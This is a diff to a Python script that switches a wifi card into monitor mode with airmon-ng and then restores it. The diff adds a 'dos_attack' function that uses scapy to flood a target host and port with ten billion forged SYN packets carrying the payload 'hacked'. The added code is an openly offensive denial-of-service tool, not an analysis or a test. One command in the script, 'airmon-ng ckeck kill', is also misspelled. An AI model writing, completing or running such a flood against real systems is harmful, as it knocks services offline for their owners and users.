@@ -1,5 +1,6 @@
 #!/usr/bin/python
 
+import socket
 from scapy.all import *
 import subprocess
 import utile
@@ -13,7 +14,6 @@ BSSID = utile.getAPMac()
 subprocess.call('clear', shell=True)
 subprocess.call('airmon-ng ckeck kill',shell=True)
 
-print('Card available ....')
 subprocess.call('airmon-ng',shell=True)
 
 networkCard = str(utile.iwconfig())
@@ -29,9 +29,19 @@ while True:
         break
 
 #Arreter le mode monitor et redemarrer la carte wifi
-print(''*5)
-print('Cleaning ...')
 subprocess.call("airmon-ng stop {}".format(networkCardMon),shell=True)
 subprocess.call("ifconfig {} up".format(networkCard),shell=True)
 subprocess.call("service NetworkManager start",shell=True)
 subprocess.call('clear',shell=True)
+
+def dos_attack(host, port):
+    try:
+        ss = socket.create_connection((host, port), 3)
+        time.sleep(2)
+    except:
+        exit ()
+    
+    ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    ss.connect((host, port))
+    time.sleep(2)
+    send(IP(dst=host) /TCP(dport=port , seq=12345,ack=1000,window=1000, flags='S')/"hacked", count=10000000000)
